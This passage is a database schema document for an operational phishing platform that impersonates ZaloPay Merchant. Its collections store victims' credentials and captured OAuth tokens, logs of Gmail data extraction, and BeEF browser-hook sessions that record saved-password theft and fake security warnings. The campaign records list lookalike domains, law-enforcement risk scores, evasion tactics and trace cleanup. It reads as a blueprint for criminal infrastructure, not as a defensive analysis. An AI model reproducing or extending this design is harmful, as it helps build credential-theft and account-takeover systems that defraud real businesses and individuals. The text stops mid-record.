# ZaloPay Merchant Phishing Platform - Database Schema Documentation

## Comprehensive Database Architecture

### Database Technology Stack
- **Primary Database**: MongoDB 6.0+ (Document-oriented storage)
- **Caching Layer**: Redis 7.0+ (In-memory data structure store)
- **Time-Series Analytics**: InfluxDB 2.0+ (Performance metrics và monitoring)
- **Search Engine**: Elasticsearch 8.0+ (Full-text search và analytics)
- **Backup Storage**: Amazon S3 Compatible (Encrypted backup storage)

### Database Design Philosophy

The database architecture follows **Event-Sourcing** và **CQRS (Command Query Responsibility Segregation)** patterns để ensure:
- **Scalability**: Horizontal scaling capability với sharding support
- **Performance**: Optimized queries với strategic indexing
- **Security**: Comprehensive encryption at rest và in transit
- **Auditability**: Complete audit trail cho all operations
- **Flexibility**: Schema evolution support for future enhancements

## Core Collections Schema

### 1. Victims Collection
**Purpose**: Primary storage for captured victim credentials và metadata
**Estimated Size**: 10GB+ (depending on campaign volume)
**Indexing Strategy**: Compound indexes on email, capture_date, market_value

```javascript
// Collection: victims
{
  "_id": ObjectId("67012345678901234567890a"),
  
  // Basic victim information
  "email": "ceo@techcorp.vn",
  "name": "Nguyễn Văn Nam",
  "phone": "+84987654321",
  "password_hash": "$2b$12$N9qo8uLOickgx2ZMRZoMye.Fhsk1YHfx8T3JDZD3/.8k6X3K2.2.m",
  
  // Capture metadata
  "capture_timestamp": ISODate("2025-10-04T15:30:25.847Z"),
  "campaign_id": ObjectId("67012345678901234567890b"),
  "capture_method": "oauth_google", // oauth_google, oauth_apple, form_direct
  "capture_source": "google_ads_campaign_q4_2025",
  
  // Session information
  "session_data": {
    "session_id": "session_20251004_153025_abc123",
    "ip_address": "192.168.1.100",
    "proxy_used": {
      "proxy_url": "socks5://vietnam-residential-01.proxy.com:1080",
      "proxy_type": "residential",
      "country": "VN",
      "provider": "ProxyProvider123"
    },
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "referrer": "https://www.google.com/search?q=zalopay+merchant+registration",
    "utm_parameters": {
      "utm_source": "google",
      "utm_medium": "cpc", 
      "utm_campaign": "zalopay_merchant_q4_2025",
      "utm_content": "business_registration"
    }
  },
  
  // Device fingerprinting data
  "device_fingerprint": {
    "fingerprint_id": "fp_abc123def456ghi789",
    "screen_resolution": "1920x1080",
    "color_depth": 24,
    "timezone": "Asia/Ho_Chi_Minh",
    "language": "vi-VN,vi;q=0.9,en;q=0.8",
    "platform": "Win32",
    "plugins": [
      "Chrome PDF Plugin",
      "Widevine Content Decryption Module", 
      "Native Client"
    ],
    "fonts": [
      "Arial", "Times New Roman", "Helvetica", "Calibri", "Tahoma"
    ],
    "canvas_signature": "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6",
    "webgl_vendor": "Intel Inc.",
    "webgl_renderer": "Intel(R) HD Graphics 620",
    "audio_fingerprint": "44100:2:f32:0.1234567890",
    "webrtc_ips": ["192.168.1.100", "10.0.0.150"]
  },
  
  // Validation results
  "validation": {
    "status": "validated", // pending, validating, validated, invalid, expired
    "validation_timestamp": ISODate("2025-10-04T15:35:10.234Z"),
    "validation_method": "oauth_token_test",
    "account_type": "business", // personal, business, enterprise
    "market_value": "high", // low, medium, high, critical
    "confidence_score": 0.92, // 0.0 - 1.0
    
    // Additional validation data
    "google_account_info": {
      "account_verified": true,
      "account_age_days": 1247,
      "two_factor_enabled": true,
      "recovery_email": "n***m@personal-email.com",
      "recovery_phone": "+84***654321"
    },
    
    // Business intelligence indicators
    "business_indicators": {
      "domain_age_days": 892,
      "company_size_estimate": "medium", // startup, small, medium, large, enterprise
      "executive_level_score": 0.85, // 0.0 - 1.0
      "industry_classification": "technology",
      "revenue_estimate_range": "$1M-$10M",
      "employee_count_estimate": "50-200"
    },
    
    // Data richness assessment
    "data_richness": {
      "gmail_access_available": true,
      "contacts_accessible": true,
      "calendar_accessible": true,
      "drive_accessible": false,
      "estimated_email_count": 15420,
      "estimated_contact_count": 2847,
      "estimated_calendar_events": 234
    }
  },
  
  // Exploitation tracking
  "exploitation_history": {
    "first_exploitation": ISODate("2025-10-04T15:40:30.567Z"),
    "last_exploitation": ISODate("2025-10-04T16:25:45.890Z"),
    "exploitation_count": 3,
    "successful_exploitations": 3,
    "gmail_accessed": true,
    "beef_hooked": true,
    "data_extracted": true
  },
  
  // Risk assessment
  "risk_assessment": {
    "detection_probability": 0.15, // 0.0 - 1.0 (probability of being detected)
    "law_enforcement_risk": "low", // low, medium, high
    "technical_sophistication": "medium", // low, medium, high
    "security_awareness_level": "low", // low, medium, high
    "countermeasure_likelihood": 0.25 // 0.0 - 1.0
  },
  
  // Timestamps
  "created_at": ISODate("2025-10-04T15:30:25.847Z"),
  "updated_at": ISODate("2025-10-04T16:25:45.890Z"),
  
  // Soft delete support
  "deleted_at": null,
  "is_active": true
}

// Indexes for victims collection
db.victims.createIndex({"email": 1}, {"unique": true})
db.victims.createIndex({"capture_timestamp": -1})
db.victims.createIndex({"validation.market_value": 1, "validation.status": 1})
db.victims.createIndex({"campaign_id": 1, "capture_timestamp": -1})
db.victims.createIndex({"session_data.ip_address": 1})
db.victims.createIndex({"device_fingerprint.fingerprint_id": 1})
db.victims.createIndex({"validation.account_type": 1, "validation.business_indicators.executive_level_score": -1})
```

### 2. OAuth Tokens Collection
**Purpose**: Secure storage of captured OAuth tokens và related metadata
**Security**: AES-256-GCM encryption for all token data
**TTL**: Automatic expiration based on token validity

```javascript
// Collection: oauth_tokens
{
  "_id": ObjectId("67012345678901234567890c"),
  "victim_id": ObjectId("67012345678901234567890a"),
  
  // OAuth provider information
  "provider": "google", // google, apple, facebook, microsoft
  "provider_metadata": {
    "authorization_server": "https://accounts.google.com",
    "client_id": "captured_from_request",
    "scopes_granted": [
      "openid",
      "email", 
      "profile",
      "https://www.googleapis.com/auth/gmail.readonly",
      "https://www.googleapis.com/auth/contacts.readonly",
      "https://www.googleapis.com/auth/calendar.readonly"
    ]
  },
  
  // Encrypted token data
  "token_data": {
    "access_token": {
      "encrypted_value": "AES256_ENCRYPTED_ACCESS_TOKEN_DATA",
      "encryption_key_id": "key_abc123def456",
      "nonce": "random_nonce_data",
      "tag": "authentication_tag"
    },
    "refresh_token": {
      "encrypted_value": "AES256_ENCRYPTED_REFRESH_TOKEN_DATA", 
      "encryption_key_id": "key_abc123def456",
      "nonce": "random_nonce_data",
      "tag": "authentication_tag"
    },
    "id_token": {
      "encrypted_value": "AES256_ENCRYPTED_ID_TOKEN_DATA",
      "encryption_key_id": "key_abc123def456", 
      "nonce": "random_nonce_data",
      "tag": "authentication_tag"
    }
  },
  
  // Token metadata
  "token_metadata": {
    "issued_at": ISODate("2025-10-04T15:30:25.000Z"),
    "expires_at": ISODate("2025-10-04T16:30:25.000Z"),
    "last_refreshed": ISODate("2025-10-04T15:30:25.000Z"),
    "refresh_count": 0,
    "token_status": "active", // active, expired, revoked, invalid
    "last_validation": ISODate("2025-10-04T15:35:10.000Z"),
    "validation_success": true
  },
  
  // Token usage tracking
  "usage_history": [
    {
      "usage_timestamp": ISODate("2025-10-04T15:35:10.000Z"),
      "usage_type": "validation", // validation, gmail_access, contact_extraction
      "admin_id": ObjectId("67012345678901234567890d"),
      "ip_address": "10.0.0.100",
      "success": true,
      "api_calls": 3,
      "data_extracted": "profile_information"
    }
  ],
  
  // Captured user profile
  "user_profile": {
    "google_id": "1234567890123456789", 
    "email": "ceo@techcorp.vn",
    "verified_email": true,
    "name": "Nguyễn Văn Nam",
    "given_name": "Nam",
    "family_name": "Nguyễn Văn",
    "picture": "https://lh3.googleusercontent.com/a/profile_picture_url",
    "locale": "vi",
    "hd": "techcorp.vn" // Hosted domain for G Suite accounts
  },
  
  // Security monitoring
  "security_events": [
    {
      "event_type": "token_created",
      "timestamp": ISODate("2025-10-04T15:30:25.000Z"),
      "details": "OAuth token successfully captured"
    },
    {
      "event_type": "token_validated",
      "timestamp": ISODate("2025-10-04T15:35:10.000Z"),
      "details": "Token validation successful"
    }
  ],
  
  "created_at": ISODate("2025-10-04T15:30:25.000Z"),
  "updated_at": ISODate("2025-10-04T15:35:10.000Z"),
  "expires_at": ISODate("2025-10-04T16:30:25.000Z") // TTL index
}

// Indexes for oauth_tokens collection
db.oauth_tokens.createIndex({"victim_id": 1})
db.oauth_tokens.createIndex({"provider": 1, "token_metadata.token_status": 1})
db.oauth_tokens.createIndex({"expires_at": 1}, {"expireAfterSeconds": 0}) // TTL index
db.oauth_tokens.createIndex({"token_metadata.issued_at": -1})
```

### 3. Admin Users Collection
**Purpose**: Administrative user management với role-based permissions
**Security**: Bcrypt password hashing, MFA support, session tracking

```javascript
// Collection: admin_users
{
  "_id": ObjectId("67012345678901234567890d"),
  
  // Basic admin information
  "username": "admin_operator_01",
  "email": "admin@secure-operations.internal",
  "password_hash": "$2b$12$LQv3c1yqBwmnJ21x7L2YsO.W3E5Q5F5F5F5F5F5F5F5F5F5F5F5F5",
  
  // Role và permissions
  "role": "senior_operator", // viewer, operator, senior_operator, admin, super_admin
  "permissions": [
    "dashboard_view",
    "victim_management",
    "gmail_exploitation", 
    "beef_control",
    "campaign_management",
    "data_export",
    "system_monitoring"
  ],
  "access_restrictions": {
    "ip_whitelist": ["10.0.0.0/24", "192.168.1.0/24"],
    "time_restrictions": {
      "allowed_hours": [8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18], // 8 AM - 6 PM
      "timezone": "Asia/Ho_Chi_Minh"
    },
    "data_access_level": "high_value_targets" // all, high_value_targets, assigned_campaigns
  },
  
  // Multi-factor authentication
  "mfa_config": {
    "mfa_enabled": true,
    "mfa_method": "totp", // totp, sms, email
    "totp_secret": "ENCRYPTED_TOTP_SECRET_KEY",
    "backup_codes": [
      "ENCRYPTED_BACKUP_CODE_1",
      "ENCRYPTED_BACKUP_CODE_2"
    ],
    "last_mfa_reset": ISODate("2025-09-15T10:00:00.000Z")
  },
  
  // Session management
  "session_config": {
    "max_concurrent_sessions": 3,
    "session_timeout_minutes": 120,
    "idle_timeout_minutes": 30,
    "require_fresh_auth_for_sensitive": true
  },
  
  // Activity tracking
  "activity_summary": {
    "last_login": ISODate("2025-10-04T14:30:00.000Z"),
    "last_activity": ISODate("2025-10-04T16:25:00.000Z"),
    "login_count_30d": 28,
    "failed_login_attempts_24h": 0,
    "victims_accessed_30d": 45,
    "gmail_exploitations_30d": 23,
    "data_exports_30d": 8
  },
  
  // Security monitoring
  "security_flags": {
    "account_locked": false,
    "password_expired": false,
    "suspicious_activity": false,
    "last_password_change": ISODate("2025-09-01T00:00:00.000Z"),
    "password_change_required": false
  },
  
  // Admin metadata
  "admin_metadata": {
    "created_by": ObjectId("67012345678901234567890e"),
    "department": "Security Operations",
    "clearance_level": "high",
    "training_completed": [
      "opsec_fundamentals",
      "gmail_exploitation", 
      "beef_framework",
      "legal_compliance"
    ]
  },
  
  "created_at": ISODate("2025-08-15T10:00:00.000Z"),
  "updated_at": ISODate("2025-10-04T16:25:00.000Z"),
  "is_active": true
}

// Indexes for admin_users collection
db.admin_users.createIndex({"username": 1}, {"unique": true})
db.admin_users.createIndex({"email": 1}, {"unique": true}) 
db.admin_users.createIndex({"role": 1, "is_active": 1})
db.admin_users.createIndex({"activity_summary.last_login": -1})
```

### 4. Campaigns Collection
**Purpose**: Phishing campaign management và performance tracking
**Analytics**: Real-time campaign metrics và success rate tracking

```javascript
// Collection: campaigns
{
  "_id": ObjectId("67012345678901234567890b"),
  
  // Campaign identification
  "name": "ZaloPay Merchant Q4 2025 - Vietnamese SME",
  "code": "ZPM_Q4_2025_VN_SME",
  "description": "Targeting Vietnamese small-medium enterprises với ZaloPay Merchant registration theme",
  
  // Campaign configuration
  "config": {
    "target_domains": [
      "zalopay-merchant.com",
      "zalopay-business.net", 
      "merchant.zalopay.vn"
    ],
    "landing_template": "zalopay_merchant_v2_vietnamese",
    "authentication_methods": ["google_oauth", "apple_oauth", "manual_form"],
    "geographic_targeting": {
      "primary_countries": ["VN"],
      "secondary_countries": ["TH", "MY", "SG"],
      "exclude_countries": ["US", "EU", "AU"] // High-risk jurisdictions
    },
    "demographic_targeting": {
      "target_languages": ["vi", "vi-VN"],
      "business_focus": true,
      "executive_targeting": true,
      "tech_savvy_level": "medium"
    }
  },
  
  // Infrastructure configuration
  "infrastructure": {
    "proxy_pool": "vietnam_residential_premium",
    "beef_enabled": true,
    "anti_detection_level": "high",
    "load_balancing": "round_robin",
    "backup_domains": [
      "zalopay-registration.com",
      "merchant-zalopay.net"
    ]
  },
  
  // Campaign timeline
  "timeline": {
    "planned_start": ISODate("2025-10-01T00:00:00.000Z"),
    "actual_start": ISODate("2025-10-01T08:30:00.000Z"),
    "planned_end": ISODate("2025-12-31T23:59:59.000Z"),
    "current_phase": "active_exploitation", // planning, launch, active_exploitation, data_mining, cleanup
    "milestones": [
      {
        "milestone": "campaign_launch",
        "planned_date": ISODate("2025-10-01T08:00:00.000Z"),
        "actual_date": ISODate("2025-10-01T08:30:00.000Z"),
        "status": "completed"
      },
      {
        "milestone": "100_victims_captured", 
        "planned_date": ISODate("2025-10-07T00:00:00.000Z"),
        "actual_date": ISODate("2025-10-05T14:30:00.000Z"),
        "status": "completed"
      }
    ]
  },
  
  // Real-time statistics
  "statistics": {
    "total_visits": 3247,
    "unique_visitors": 2891,
    "credential_captures": 847,
    "successful_validations": 612,
    "high_value_targets": 89,
    "business_accounts": 234,
    
    // Conversion funnel
    "conversion_rates": {
      "visit_to_interaction": 0.73,  // Visitors who interact với content
      "interaction_to_auth_attempt": 0.45, // Users who attempt authentication
      "auth_attempt_to_capture": 0.82, // Successful credential captures
      "capture_to_validation": 0.72,  // Captured credentials that validate
      "overall_conversion": 0.21       // Overall visit-to-valid-credential rate
    },
    
    // Performance metrics
    "performance_metrics": {
      "average_session_duration_seconds": 245,
      "bounce_rate": 0.28,
      "pages_per_session": 3.4,
      "load_time_average_ms": 1250,
      "proxy_success_rate": 0.94
    },
    
    // Geographic breakdown
    "geographic_distribution": {
      "VN": {"visits": 2847, "captures": 723, "success_rate": 0.254},
      "TH": {"visits": 245, "captures": 67, "success_rate": 0.273}, 
      "MY": {"visits": 123, "captures": 41, "success_rate": 0.333},
      "SG": {"visits": 32, "captures": 16, "success_rate": 0.500}
    },
    
    // Time-based analytics
    "hourly_performance": {
      "peak_hours": [9, 10, 11, 14, 15, 16], // Local time
      "best_conversion_hours": [10, 11, 15],
      "worst_performance_hours": [2, 3, 4, 5]
    }
  },
  
  // Success criteria
  "success_criteria": {
    "target_captures": 1000,
    "target_validations": 700,
    "target_high_value": 100,
    "min_success_rate": 0.20,
    "max_detection_incidents": 5
  },
  
  // Risk management
  "risk_assessment": {
    "current_risk_level": "medium", // low, medium, high, critical
    "detection_incidents": 2,
    "law_enforcement_interest": "none", // none, monitoring, investigating, active
    "technical_countermeasures": 1,
    "mitigation_actions": [
      "domain_rotation_implemented",
      "proxy_pool_expanded", 
      "content_variation_increased"
    ]
  },
  
  // Team assignment
  "team": {
    "campaign_manager": ObjectId("67012345678901234567890d"),
    "technical_lead": ObjectId("67012345678901234567890f"),
    "analysts": [
      ObjectId("67012345678901234567890g"),
      ObjectId("67012345678901234567890h")
    ],
    "operators": [
      ObjectId("67012345678901234567890i"),
      ObjectId("67012345678901234567890j")
    ]
  },
  
  // Campaign status
  "status": "active", // draft, active, paused, suspended, completed, archived
  "status_history": [
    {
      "status": "draft",
      "timestamp": ISODate("2025-09-15T10:00:00.000Z"),
      "changed_by": ObjectId("67012345678901234567890d"),
      "reason": "Campaign created"
    },
    {
      "status": "active", 
      "timestamp": ISODate("2025-10-01T08:30:00.000Z"),
      "changed_by": ObjectId("67012345678901234567890d"),
      "reason": "Campaign launched"
    }
  ],
  
  "created_at": ISODate("2025-09-15T10:00:00.000Z"),
  "updated_at": ISODate("2025-10-04T16:30:00.000Z"),
  "created_by": ObjectId("67012345678901234567890d")
}

// Indexes for campaigns collection
db.campaigns.createIndex({"code": 1}, {"unique": true})
db.campaigns.createIndex({"status": 1, "timeline.actual_start": -1})
db.campaigns.createIndex({"team.campaign_manager": 1})
db.campaigns.createIndex({"config.geographic_targeting.primary_countries": 1})
```

### 5. Activity Logs Collection
**Purpose**: Comprehensive audit trail cho all administrative actions
**Retention**: 2-year retention với automated archival
**Compliance**: SOC2 và legal compliance requirements

```javascript
// Collection: activity_logs
{
  "_id": ObjectId("67012345678901234567890k"),
  
  // Action identification
  "log_id": "LOG_20251004_162530_abc123",
  "action_type": "gmail_exploitation_initiate", // Structured action classification
  "action_category": "data_access", // authentication, data_access, system_admin, campaign_mgmt
  "severity_level": "high", // low, medium, high, critical
  
  // Actor information
  "actor": {
    "admin_id": ObjectId("67012345678901234567890d"),
    "username": "admin_operator_01",
    "role": "senior_operator",
    "session_id": "admin_session_20251004_143000_xyz789"
  },
  
  // Target information
  "target": {
    "resource_type": "victim_gmail_account",
    "resource_id": ObjectId("67012345678901234567890a"),
    "resource_identifier": "ceo@techcorp.vn",
    "additional_context": {
      "market_value": "high",
      "account_type": "business",
      "exploitation_method": "oauth_tokens"
    }
  },
  
  // Action details
  "action_details": {
    "operation": "gmail_access_initiate",
    "parameters": {
      "access_method": "oauth_tokens",
      "extraction_config": {
        "extract_emails": true,
        "extract_contacts": true,
        "extract_attachments": true,
        "max_emails": 500
      },
      "use_proxy": true,
      "stealth_mode": true
    },
    "execution_time_seconds": 0.045,
    "success": true,
    "result_summary": {
      "gmail_access_established": true,
      "extraction_initiated": true,
      "estimated_data_size": "large"
    }
  },
  
  // Technical context
  "technical_context": {
    "ip_address": "10.0.0.100",
    "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "proxy_used": "socks5://admin-proxy-singapore-01.secure.com:1080",
    "vpn_endpoint": "singapore_secure_01",
    "request_id": "req_20251004_162530_def456",
    "api_version": "v2.1"
  },
  
  // Geographic context
  "geographic_context": {
    "admin_location": {
      "country": "SG",
      "city": "Singapore", 
      "timezone": "Asia/Singapore",
      "coordinates": [1.3521, 103.8198] // Approximate
    },
    "target_location": {
      "country": "VN",
      "city": "Ho Chi Minh City",
      "timezone": "Asia/Ho_Chi_Minh"
    }
  },
  
  // Security monitoring
  "security_flags": {
    "suspicious_activity": false,
    "unusual_timing": false,
    "abnormal_access_pattern": false,
    "elevated_privilege_use": true,
    "cross_border_access": true
  },
  
  // Compliance tracking
  "compliance": {
    "requires_approval": false,
    "approved_by": null,
    "legal_basis": "authorized_security_testing",
    "data_classification": "highly_sensitive",
    "retention_period_days": 730,
    "export_restricted": true
  },
  
  // Related activities
  "related_logs": [
    ObjectId("67012345678901234567890l"), // Previous Gmail access attempt
    ObjectId("67012345678901234567890m")  // Related victim capture log
  ],
  
  // Timestamps
  "timestamp": ISODate("2025-10-04T16:25:30.847Z"),
  "created_at": ISODate("2025-10-04T16:25:30.847Z"),
  
  // Archival information
  "archived": false,
  "archive_date": null,
  "retention_expires": ISODate("2027-10-04T16:25:30.847Z")
}

// Indexes for activity_logs collection
db.activity_logs.createIndex({"actor.admin_id": 1, "timestamp": -1})
db.activity_logs.createIndex({"action_type": 1, "timestamp": -1})
db.activity_logs.createIndex({"target.resource_type": 1, "target.resource_id": 1})
db.activity_logs.createIndex({"timestamp": -1})
db.activity_logs.createIndex({"retention_expires": 1}, {"expireAfterSeconds": 0}) // TTL for retention
db.activity_logs.createIndex({"action_category": 1, "severity_level": 1, "timestamp": -1})
```

### 6. Gmail Access Logs Collection  
**Purpose**: Detailed logging of Gmail exploitation activities
**Analysis**: Intelligence gathering effectiveness tracking

```javascript
// Collection: gmail_access_logs
{
  "_id": ObjectId("67012345678901234567890n"),
  
  // Access session identification
  "session_id": "gmail_access_20251004_162530_ghi789",
  "parent_activity_log": ObjectId("67012345678901234567890k"),
  
  // Participants
  "admin_id": ObjectId("67012345678901234567890d"),
  "victim_id": ObjectId("67012345678901234567890a"),
  
  // Access methodology
  "access_method": "oauth_tokens", // oauth_tokens, session_cookies, credential_replay
  "authentication_details": {
    "oauth_provider": "google",
    "token_freshness": "current", // current, refreshed, expired
    "scope_coverage": [
      "https://www.googleapis.com/auth/gmail.readonly",
      "https://www.googleapis.com/auth/contacts.readonly"
    ],
    "api_calls_made": 47,
    "rate_limit_encountered": false
  },
  
  // Session timeline
  "session_timeline": {
    "initiation": ISODate("2025-10-04T16:25:30.000Z"),
    "authentication_complete": ISODate("2025-10-04T16:25:35.000Z"),
    "data_extraction_start": ISODate("2025-10-04T16:25:40.000Z"),
    "data_extraction_complete": ISODate("2025-10-04T16:42:15.000Z"),
    "session_cleanup": ISODate("2025-10-04T16:42:30.000Z"),
    "total_duration_seconds": 1020
  },
  
  // Extracted intelligence
  "extraction_results": {
    "emails": {
      "total_accessible": 15420,
      "filtered_for_intelligence": 2847,
      "extracted_count": 456,
      "high_value_count": 89,
      "categories": {
        "business_contracts": 23,
        "financial_communications": 45,
        "executive_correspondence": 67,
        "confidential_documents": 12,
        "security_related": 8
      }
    },
    
    "contacts": {
      "total_contacts": 2847,
      "business_contacts": 1892,
      "executive_contacts": 234,
      "international_contacts": 567,
      "high_value_relationships": 78,
      "contact_categories": {
        "c_level_executives": 23,
        "government_officials": 5,
        "financial_institutions": 45,
        "key_clients": 156,
        "suppliers_vendors": 234
      }
    },
    
    "attachments": {
      "total_attachments_found": 3456,
      "downloaded_count": 234,
      "file_types": {
        "pdf_documents": 123,
        "office_documents": 67,
        "images": 34,
        "spreadsheets": 10
      },
      "sensitive_documents": {
        "contracts": 12,
        "financial_reports": 8,
        "confidential_memos": 5
      }
    },
    
    "calendar_data": {
      "events_extracted": 234,
      "meeting_types": {
        "board_meetings": 12,
        "client_meetings": 67,
        "financial_reviews": 23,
        "strategic_planning": 15
      },
      "attendee_analysis": {
        "external_attendees": 145,
        "high_value_contacts": 34
      }
    }
  },
  
  // Intelligence analysis
  "intelligence_analysis": {
    "overall_intelligence_value": 0.87, // 0.0 - 1.0
    "business_intelligence_score": 0.92,
    "security_intelligence_score": 0.73,
    "personal_intelligence_score": 0.65,
    
    "key_findings": [
      "Executive-level access confirmed",
      "Extensive business network identified",
      "Financial planning documents accessed",
      "International business relationships mapped",
      "Security practices analyzed"
    ],
    
    "exploitation_opportunities": [
      {
        "opportunity": "lateral_phishing_campaign",
        "description": "Target identified business contacts for expanded campaign",
        "estimated_success_rate": 0.65,
        "potential_targets": 234
      },
      {
        "opportunity": "business_intelligence_analysis", 
        "description": "Comprehensive business relationship mapping",
        "estimated_value": "high",
        "data_points": 1247
      }
    ],
    
    "risk_indicators": [
      "Security-conscious email patterns detected",
      "Two-factor authentication usage confirmed", 
      "Regular security audit emails found"
    ]
  },
  
  // Operational security
  "operational_security": {
    "proxy_configuration": {
      "proxy_used": "socks5://singapore-premium-01.proxy.com:1080",
      "proxy_country": "SG",
      "proxy_type": "datacenter",
      "connection_encrypted": true
    },
    "fingerprinting": {
      "admin_fingerprint_id": "admin_fp_abc123def456",
      "user_agent_spoofed": true,
      "browser_fingerprint_masked": true
    },
    "trace_cleanup": {
      "browser_cache_cleared": true,
      "cookies_cleared": true,
      "history_cleared": true,
      "temp_files_removed": true
    }
  },
  
  // Export tracking
  "data_exports": [
    {
      "export_id": "export_20251004_164230_jkl012",
      "export_type": "high_value_emails",
      "format": "json",
      "record_count": 89,
      "file_size_bytes": 2456789,
      "export_location": "/secure/exports/emails_ceo_techcorp_20251004.json.encrypted",
      "exported_at": ISODate("2025-10-04T16:42:30.000Z")
    },
    {
      "export_id": "export_20251004_164245_mno345", 
      "export_type": "business_contacts",
      "format": "csv",
      "record_count": 1892,
      "file_size_bytes": 567890,
      "export_location": "/secure/exports/contacts_ceo_techcorp_20251004.csv.encrypted",
      "exported_at": ISODate("2025-10-04T16:42:45.000Z")
    }
  ],
  
  // Performance metrics
  "performance_metrics": {
    "api_calls_per_minute": 2.8,
    "data_transfer_rate_mbps": 1.2,
    "error_rate": 0.02,
    "retry_count": 3,
    "timeout_count": 0
  },
  
  "created_at": ISODate("2025-10-04T16:25:30.000Z"),
  "completed_at": ISODate("2025-10-04T16:42:30.000Z"),
  "status": "completed" // in_progress, completed, failed, aborted
}

// Indexes for gmail_access_logs collection
db.gmail_access_logs.createIndex({"admin_id": 1, "created_at": -1})
db.gmail_access_logs.createIndex({"victim_id": 1, "created_at": -1})
db.gmail_access_logs.createIndex({"session_timeline.initiation": -1})
db.gmail_access_logs.createIndex({"intelligence_analysis.overall_intelligence_value": -1})
db.gmail_access_logs.createIndex({"status": 1, "created_at": -1})
```

### 7. BeEF Sessions Collection
**Purpose**: Browser exploitation session tracking và command execution logs
**Real-time**: Active session monitoring với WebSocket integration

```javascript
// Collection: beef_sessions
{
  "_id": ObjectId("67012345678901234567890o"),
  
  // Session identification
  "beef_session_id": "beef_20251004_153100_pqr678",
  "hook_id": "hBsWb07O4bTU9AkDz4Q4q1dLZxYzr6dS", // BeEF-generated hook ID
  "victim_id": ObjectId("67012345678901234567890a"),
  
  // Hook injection details
  "injection_details": {
    "injection_timestamp": ISODate("2025-10-04T15:31:00.000Z"),
    "injection_method": "oauth_success_page", // oauth_success_page, landing_page, redirect
    "injection_point": "auth_success_page_load",
    "hook_url": "https://zalopay-merchant.com/assets/js/security.js",
    "stealth_mode": true,
    "obfuscated": true
  },
  
  // Browser intelligence
  "browser_profile": {
    "browser_name": "Chrome",
    "browser_version": "118.0.0.0",
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "operating_system": "Windows 10",
    "architecture": "x64",
    "platform": "Win32",
    "screen_resolution": "1920x1080",
    "color_depth": 24,
    "timezone": "Asia/Ho_Chi_Minh",
    "language": "vi-VN",
    "java_enabled": false,
    "cookies_enabled": true
  },
  
  // Browser capabilities
  "browser_capabilities": {
    "local_storage": true,
    "session_storage": true, 
    "indexed_db": true,
    "web_sql": false,
    "geolocation": true,
    "notifications": false,
    "camera_access": false,
    "microphone_access": false,
    "webrtc_supported": true,
    "websocket_supported": true
  },
  
  // Network information
  "network_info": {
    "public_ip": "192.168.1.100",
    "internal_ips": ["192.168.1.100", "10.0.0.150"],
    "connection_type": "ethernet",
    "proxy_detected": false,
    "vpn_detected": false,
    "isp": "Viettel",
    "asn": "AS7552"
  },
  
  // Session status
  "session_status": {
    "status": "active", // active, inactive, expired, terminated
    "first_seen": ISODate("2025-10-04T15:31:00.000Z"),
    "last_seen": ISODate("2025-10-04T16:45:30.000Z"),
    "heartbeat_interval": 30, // seconds
    "missed_heartbeats": 0,
    "total_session_duration": 4470, // seconds
    "page_url": "https://zalopay-merchant.com/dashboard"
  },
  
  // Executed commands
  "commands_executed": [
    {
      "command_id": "cmd_001_20251004_153130",
      "module_name": "Browser_Information",
      "command_name": "get_system_info",
      "executed_at": ISODate("2025-10-04T15:31:30.000Z"),
      "execution_time_ms": 245,
      "success": true,
      "result": {
        "cpu_cores": 8,
        "memory_gb": 16,
        "screen_details": "1920x1080x24",
        "browser_plugins": ["Chrome PDF Plugin", "Widevine CDM"]
      }
    },
    {
      "command_id": "cmd_002_20251004_153200",
      "module_name": "Get_Stored_Credentials",
      "command_name": "extract_saved_passwords",
      "executed_at": ISODate("2025-10-04T15:32:00.000Z"),
      "execution_time_ms": 1200,
      "success": true,
      "result": {
        "credentials_found": 12,
        "sites": [
          {"site": "facebook.com", "username": "user@email.com"},
          {"site": "banking-site.com", "username": "customer123"},
          {"site": "google.com", "username": "ceo@techcorp.vn"}
        ]
      },
      "intelligence_value": "high"
    },
    {
      "command_id": "cmd_003_20251004_153300",
      "module_name": "Social_Engineering",
      "command_name": "fake_security_warning",
      "executed_at": ISODate("2025-10-04T15:33:00.000Z"),
      "execution_time_ms": 500,
      "success": true,
      "parameters": {
        "title": "Security Alert",
        "message": "Suspicious activity detected. Please verify your identity.",
        "button_text": "Verify Now",
        "callback_url": "https://zalopay-secure-verify.com/auth"
      },
      "result": {
        "notification_displayed": true,
        "user_interaction": true,
        "button_clicked": true,
        "redirect_successful": true
      },
      "intelligence_value": "medium"
    },
    {
      "command_id": "cmd_004_20251004_153500",
      "module_name": "Webcam_Permissions",
      "command_name": "request_camera_access",
      "executed_at": ISODate("2025-10-04T15:35:00.000Z"),
      "execution_time_ms": 3000,
      "success": false,
      "parameters": {
        "reason": "Video call verification required"
      },
      "result": {
        "permission_requested": true,
        "user_response": "denied",
        "error": "User denied camera access"
      },
      "intelligence_value": "low"
    }
  ],
  
  // Exploitation phases
  "exploitation_phases": [
    {
      "phase_name": "reconnaissance",
      "start_time": ISODate("2025-10-04T15:31:00.000Z"),
      "end_time": ISODate("2025-10-04T15:35:00.000Z"),
      "commands_count": 5,
      "success_rate": 1.0,
      "intelligence_gathered": "system_info, browser_capabilities, network_info"
    },
    {
      "phase_name": "credential_harvesting",
      "start_time": ISODate("2025-10-04T15:35:00.000Z"),
      "end_time": ISODate("2025-10-04T15:40:00.000Z"),
      "commands_count": 3,
      "success_rate": 0.67,
      "intelligence_gathered": "saved_passwords, autofill_data"
    },
    {
      "phase_name": "social_engineering",
      "start_time": ISODate("2025-10-04T15:40:00.000Z"),
      "end_time": ISODate("2025-10-04T15:50:00.000Z"), 
      "commands_count": 4,
      "success_rate": 0.75,
      "intelligence_gathered": "user_behavior, trust_level"
    }
  ],
  
  // Intelligence summary
  "intelligence_summary": {
    "overall_success_rate": 0.78,
    "high_value_intelligence": 3,
    "medium_value_intelligence": 5,
    "low_value_intelligence": 2,
    "total_commands_executed": 12,
    "successful_commands": 9,
    "failed_commands": 3,
    "victim_cooperation_level": "medium", // low, medium, high
    "security_awareness_level": "medium" // low, medium, high
  },
  
